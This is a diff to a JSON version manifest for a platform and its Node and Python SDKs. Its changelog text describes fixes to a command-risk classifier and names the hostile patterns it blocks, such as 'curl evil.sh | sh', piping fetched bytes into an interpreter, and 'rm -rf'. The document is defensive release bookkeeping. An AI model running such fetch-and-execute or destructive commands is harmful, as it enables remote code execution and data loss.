@@ -1,21 +1,21 @@
 {
   "node": {
-    "current_version": "5.11.4",
+    "current_version": "5.11.5",
     "next_bump": "none",
-    "reason": "no Node SDK source change in 5.11.4 - version advances per the unified model but the SDK is NOT republished; the registry stays at 5.6.2 (published 2026-07-28).",
+    "reason": "no Node SDK source change in 5.11.5 - version advances per the unified model but the SDK is NOT republished; the registry stays at 5.6.2 (published 2026-07-28).",
     "domains": [
       "platform"
     ]
   },
   "python": {
-    "current_version": "5.11.4",
+    "current_version": "5.11.5",
     "next_bump": "none",
-    "reason": "no Python SDK source change in 5.11.4 - version advances per the unified model but the SDK is NOT republished; the registry stays at 5.6.2 (published 2026-07-28).",
+    "reason": "no Python SDK source change in 5.11.5 - version advances per the unified model but the SDK is NOT republished; the registry stays at 5.6.2 (published 2026-07-28).",
     "domains": [
       "platform"
     ]
   },
-  "reason": "5.11.4 fixes an evidence-classifier false positive: piping fetched bytes into an inline interpreter script (curl ... | python -c \"...\") was graded remote_exec/70 and hard-blocked at 100 like curl evil.sh | sh; it now distinguishes stdin-as-data from stdin-as-code. Also corrects the MCP dashclaw_guard tool description (evaluate-only, does not create an approval). Platform + MCP-server description only; no Node/Python SDK surface change.",
+  "reason": "5.11.5 fixes the sibling of the 5.11.4 evidence-classifier false positive: a git commit/tag/stash/notes message describing a destructive-command fix (rm -rf, curl | sh) was scanned as if it were the command and hard-blocked at 100. The classifier now exempts a lone git message command via a shell-quoting-correct code skeleton (command substitution and surviving operators still disqualify). Platform only; no Node/Python SDK surface change.",
   "domains": [
     "platform"
   ]
